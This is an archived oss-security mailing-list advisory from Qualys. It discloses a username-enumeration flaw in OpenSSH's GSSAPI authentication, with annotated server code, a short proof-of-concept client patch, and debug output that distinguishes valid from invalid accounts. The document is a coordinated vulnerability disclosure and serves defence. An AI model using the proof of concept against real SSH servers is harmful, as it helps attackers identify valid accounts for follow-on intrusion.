X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7471" "Monday" "27" "August" "2018" "09:27:30" "-0700" "Qualys Security Advisory" "qsa@qualys.com" "<20180827162730.GA24878@localhost.localdomain>" "168" "[oss-security] Another OpenSSH \"user enumeration\"" "^Date:" nil nil "8" "2018082716:27:30" "[oss-security] Another OpenSSH \"user enumeration\"" (number mark "        qsa@qualys.c Aug 27  168/7471  " thread-indent "\"[oss-security] Another OpenSSH \"user enumeration\"\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 14299 invoked by uid 550); 27 Aug 2018 16:32:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 14266 invoked from network); 27 Aug 2018 16:32:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=qualys.com; s=google;
        h=date:from:to:subject:message-id:mime-version:content-disposition;
        bh=yD5Wy8saPFnSPj8DMpeYFdE4IctARTehDXn3yUpS+0U=;
        b=LsqebQc7ID/NwBpfduYmcpoKyY0iwAKDsj4sDdAQv1pFCsbL+7xCX1AaeSrZKmtZU8
         cU1e3gJErBscfok+hlnOqNkXx0K2vZpWhYXJghz7NV/2A9XL0jdgkL95WUI0DUIu5NMg
         jdiCwcgEXMJ3ADcg9/BVoHBY40HwD82zzfKgKMBbfSk7u037palxOhapO8emRxOd80Ic
         WUiOFXyCCZ7igK1MNWcK+au2x7fFtzJIhq0rVbn4dfgVZpsZsm/IwKREOsKmL0q2TrrS
         cm8DqcNb8TLseqdbtz1uaLvIbjp8JYGojEdnhGCWBkE4yc5DhMdO8BQq1goNoKtzVnx0
         EW2g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:date:from:to:subject:message-id:mime-version
         :content-disposition;
        bh=yD5Wy8saPFnSPj8DMpeYFdE4IctARTehDXn3yUpS+0U=;
        b=VhCFbdFx0V3zbcngMEyB3OBMyUrJUz7+mTUqiHgBEfr+ZzAwX4k+gZ3LF3/2jD6MrK
         ujwN5Pyl8RE95FJFGPmARHUF2pnOONZRNsVWy61KM81qkSmSSzD3fJTqovjfPTG53PU9
         jvVzHZZYbmkrNLFL/b6gwTYERbr1ZbnNu+N0uP9M4Lhs/1MXQ8Rf8ELN2MIRGlJ6NOp/
         UfFJoaya6xh6l38EdA/L5YJwRY9rpCR9mt+hgTS9+LlYiLDRYpeD7z+sXfIQQWNt25wv
         HCrSUw75f4sHyYVQIOHeSE2xaR3mhwGB0E/ITz3KpLcUyvhM97Dlr1JsLUZlNKLPRHv6
         rpBA==
X-Gm-Message-State: APzg51BIrMWcOqYq8Ra+B6lKbuQKLq8ejmlt5lhL+n09xhp2P3tUQCct
	o5FC291WsVCmdym+rozwTz4fliTG/L9uww==
X-Google-Smtp-Source: ANB0VdbuH+aYZJgz+7WvNaEgYMV0Ejx68JjhpGu7kl5LL4D7vdrzKnp+aTedYERIr5sFkE76dRYPYw==
X-Received: by 2002:a63:1316:: with SMTP id i22-v6mr400468pgl.86.1535387545868;
        Mon, 27 Aug 2018 09:32:25 -0700 (PDT)
Message-ID: <20180827162730.GA24878@localhost.localdomain>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Date: Mon, 27 Aug 2018 09:27:30 -0700
From: Qualys Security Advisory <qsa@qualys.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Another OpenSSH "user enumeration"
To: oss-security@lists.openwall.com

Hi all,

On August 24, 2018, we sent the following email to openssh@openssh.com
and distros@vs.openwall.org. About the disclosure of this issue, Solar
Designer wrote "I'd be even happier with it being made public right away
if that's OK with both the OpenSSH team and Qualys", and Theo de Raadt
wrote "More than reporting to us, I urge you to publish it"; for a
detailed explanation, please refer to Damien Miller's post:

http://www.openwall.com/lists/oss-security/2018/08/24/1

We thank the OpenSSH developers and the members of
distros@vs.openwall.org for their constructive comments, suggestions,
and feedback.

========================================================================

While properly reviewing the now-famous OpenSSH commit
https://github.com/openbsd/src/commit/779974d35b4859c07bc3cb8a12c74b43b0a7d1e0
we discovered another username-enumeration vulnerability in auth2-gss.c
(enabled by default on at least Fedora, CentOS, and Red Hat Enterprise
Linux).

This vulnerability affects OpenSSH versions from 5.9 (September 6, 2011)
to the recently released 7.8 (August 24, 2018), inclusive. It is quite
similar to CVE-2018-15473 (it is not a timing attack), but it is also
markedly different (code excerpts from OpenSSH 7.8p1):

 61 static int
 62 userauth_gssapi(struct ssh *ssh)
 63 {
...
106         if (!authctxt->valid || authctxt->user == NULL) {
107                 debug2("%s: disabled because of invalid user", __func__);
108                 free(doid);
109                 return (0);
110         }
111 
112         if (GSS_ERROR(PRIVSEP(ssh_gssapi_server_ctx(&ctxt, &goid)))) {
113                 if (ctxt != NULL)
114                         ssh_gssapi_delete_ctx(&ctxt);
115                 free(doid);
116                 authctxt->server_caused_failure = 1;
117                 return (0);
118         }
...
123         if ((r = sshpkt_start(ssh, SSH2_MSG_USERAUTH_GSSAPI_RESPONSE)) != 0 ||
124             (r = sshpkt_put_string(ssh, doid, len)) != 0 ||
125             (r = sshpkt_send(ssh)) != 0)
...
132         authctxt->postponed = 1;
133 
134         return (0);
135 }

- If this first step of the GSSAPI authentication succeeds, then
  "postponed" is set to 1 (at line 132) and the server sends a packet
  SSH2_MSG_USERAUTH_GSSAPI_RESPONSE to the attacker (at lines 123-125):
  in this particular case, the user is necessarily valid (it exists).

- Otherwise "postponed" is not set, and userauth_gssapi() returns 0 at
  line 117 or 109: in both cases, the server's userauth_finish() sends a
  packet SSH2_MSG_USERAUTH_FAILURE to the attacker, who should therefore
  be unable to distinguish between a valid and invalid user. However, if
  the user is valid, then "server_caused_failure" is set (at line 116);
  if the user is invalid, it is not set. Consequently, the behavior of
  userauth_finish() changes:

340 void
341 userauth_finish(struct ssh *ssh, int authenticated, const char *method,
342     const char *submethod)
343 {
...
410                 if (!partial && !authctxt->server_caused_failure &&
411                     (authctxt->attempt > 1 || strcmp(method, "none") != 0))
412                         authctxt->failures++;
413                 if (authctxt->failures >= options.max_authtries) {
...
417                         auth_maxtries_exceeded(authctxt);
418                 }
...
422                 packet_start(SSH2_MSG_USERAUTH_FAILURE);
423                 packet_put_cstring(methods);
424                 packet_put_char(partial);
425                 packet_send();
...
429 }

  . if the user is valid, then "server_caused_failure" is set,
    "failures" is not incremented, and the attacker can attempt the
    GSSAPI authentication indefinitely;

  . if the user is invalid, then "server_caused_failure" is not set,
    "failures" is incremented (at line 412), and the server will
    disconnect the attacker (at line 417) after max_authtries
    authentication attempts (6, by default).

Below is a very crude proof-of-concept (a patch for the client in
OpenSSH 7.8p1):

------------------------------------------------------------------------

diff -pruN openssh-7.8p1/gss-genr.c openssh-7.8p1-poc/gss-genr.c
--- openssh-7.8p1/gss-genr.c	2018-08-22 22:41:42.000000000 -0700
+++ openssh-7.8p1-poc/gss-genr.c	2018-08-22 22:41:42.000000000 -0700
@@ -286,6 +286,7 @@ ssh_gssapi_check_mechanism(Gssctxt **ctx
 
 	ssh_gssapi_build_ctx(ctx);
 	ssh_gssapi_set_oid(*ctx, oid);
+	return 1;
 	major = ssh_gssapi_import_name(*ctx, host);
 	if (!GSS_ERROR(major)) {
 		major = ssh_gssapi_init_ctx(*ctx, 0, GSS_C_NO_BUFFER, &token, 
diff -pruN openssh-7.8p1/sshconnect2.c openssh-7.8p1-poc/sshconnect2.c
--- openssh-7.8p1/sshconnect2.c	2018-08-22 22:41:42.000000000 -0700
+++ openssh-7.8p1-poc/sshconnect2.c	2018-08-22 22:41:42.000000000 -0700
@@ -701,6 +701,7 @@ userauth_gssapi(Authctxt *authctxt)
 	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_TOKEN, &input_gssapi_token);
 	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_ERROR, &input_gssapi_error);
 	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_ERRTOK, &input_gssapi_errtok);
+	return 1;
 
 	mech++; /* Move along to next candidate */
 
------------------------------------------------------------------------

For example, on Fedora, "adm" is a valid user, but "pocorgtfo" is not:

------------------------------------------------------------------------

./ssh -v -F /etc/ssh/ssh_config -o PreferredAuthentications=gssapi-with-mic adm@127.0.0.1
...
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Next authentication method: gssapi-with-mic
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
...

./ssh -v -F /etc/ssh/ssh_config -o PreferredAuthentications=gssapi-with-mic pocorgtfo@127.0.0.1
...
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Next authentication method: gssapi-with-mic
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
debug1: Authentications that can continue: publickey,gssapi-with-mic,password
Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
Disconnected from 127.0.0.1 port 22

------------------------------------------------------------------------

We understand that the OpenSSH developers do not want to treat such a
username enumeration (or "oracle") as a vulnerability (although it is
quite useful in an attacker's toolbox), but how should we coordinate
this disclosure, then? OpenSSH developers, distros, please advise.

Thank you very much! With best regards,

-- 
the Qualys Security Advisory team
